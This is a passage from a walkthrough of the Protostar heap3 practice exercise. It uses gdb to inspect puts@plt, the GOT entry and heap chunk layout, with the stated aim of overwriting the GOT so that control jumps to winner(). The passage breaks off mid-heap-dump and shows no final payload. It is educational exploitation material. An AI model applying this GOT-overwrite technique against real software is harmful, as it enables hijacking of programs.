</span><span class='line'><span class="mh">0x08048796</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="mh">0x68</span>
</span><span class='line'><span class="mh">0x0804879b</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="mh">0x80486b0</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>

<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048ff2</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8048ff2</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3211.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048750</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048750</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8049824</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span> <span class="n">at</span> <span class="mh">0x8049824</span><span class="o">:</span> <span class="n">file</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">3583.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8048790</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span> <span class="n">at</span> <span class="mh">0x8048790</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run the program with some recognizable input strings.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">AAAAAAAAAAAA</span> <span class="n">BBBBBBBBBBBB</span> <span class="n">CCCCCCCCCCCC</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
</span><span class='line'>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
initialized.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now look at the mapped memory regions.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">proc</span> <span class="n">mapping</span>
</span><span class='line'><span class="n">process</span> <span class="mi">1542</span>
</span><span class='line'><span class="n">cmdline</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">cwd</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">exe</span> <span class="o">=</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">Mapped</span> <span class="n">address</span> <span class="nl">spaces</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Start</span> <span class="n">Addr</span>   <span class="n">End</span> <span class="n">Addr</span>       <span class="n">Size</span>     <span class="n">Offset</span> <span class="n">objfile</span>
</span><span class='line'>   <span class="mh">0x8048000</span>  <span class="mh">0x804b000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
</span><span class='line'>   <span class="mh">0x804b000</span>  <span class="mh">0x804c000</span>     <span class="mh">0x1000</span>     <span class="mh">0x3000</span>        <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span>
</span><span class='line'>   <span class="mh">0x804c000</span>  <span class="mh">0x804d000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
</span><span class='line'>  <span class="mh">0xb7e96000</span> <span class="mh">0xb7e97000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7e97000</span> <span class="mh">0xb7fd5000</span>   <span class="mh">0x13e000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd5000</span> <span class="mh">0xb7fd6000</span>     <span class="mh">0x1000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd6000</span> <span class="mh">0xb7fd8000</span>     <span class="mh">0x2000</span>   <span class="mh">0x13e000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd8000</span> <span class="mh">0xb7fd9000</span>     <span class="mh">0x1000</span>   <span class="mh">0x140000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fd9000</span> <span class="mh">0xb7fdc000</span>     <span class="mh">0x3000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7fe0000</span> <span class="mh">0xb7fe2000</span>     <span class="mh">0x2000</span>          <span class="mi">0</span>
</span><span class='line'>  <span class="mh">0xb7fe2000</span> <span class="mh">0xb7fe3000</span>     <span class="mh">0x1000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
</span><span class='line'>  <span class="mh">0xb7fe3000</span> <span class="mh">0xb7ffe000</span>    <span class="mh">0x1b000</span>          <span class="mi">0</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7ffe000</span> <span class="mh">0xb7fff000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1a000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xb7fff000</span> <span class="mh">0xb8000000</span>     <span class="mh">0x1000</span>    <span class="mh">0x1b000</span>         <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11.2</span><span class="p">.</span><span class="n">so</span>
</span><span class='line'>  <span class="mh">0xbffeb000</span> <span class="mh">0xc0000000</span>    <span class="mh">0x15000</span>          <span class="mi">0</span>           <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
time execution stops.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">define</span> <span class="n">hook</span><span class="o">-</span><span class="n">stop</span>
</span><span class='line'><span class="n">Type</span> <span class="n">commands</span> <span class="k">for</span> <span class="n">definition</span> <span class="n">of</span> <span class="s">&quot;hook-stop&quot;</span><span class="p">.</span>
</span><span class='line'><span class="n">End</span> <span class="n">with</span> <span class="n">a</span> <span class="n">line</span> <span class="n">saying</span> <span class="n">just</span> <span class="s">&quot;end&quot;</span><span class="p">.</span>
</span><span class='line'><span class="o">&gt;</span><span class="n">x</span><span class="o">/</span><span class="mi">56</span><span class="n">wx</span> <span class="mh">0x804c000</span>
</span><span class='line'><span class="o">&gt;</span><span class="n">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000fb1</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
because there&rsquo;s no previous chunk that&rsquo;s free.</p>

<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
the remaining two <code>strcpy()</code>&rsquo;s.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
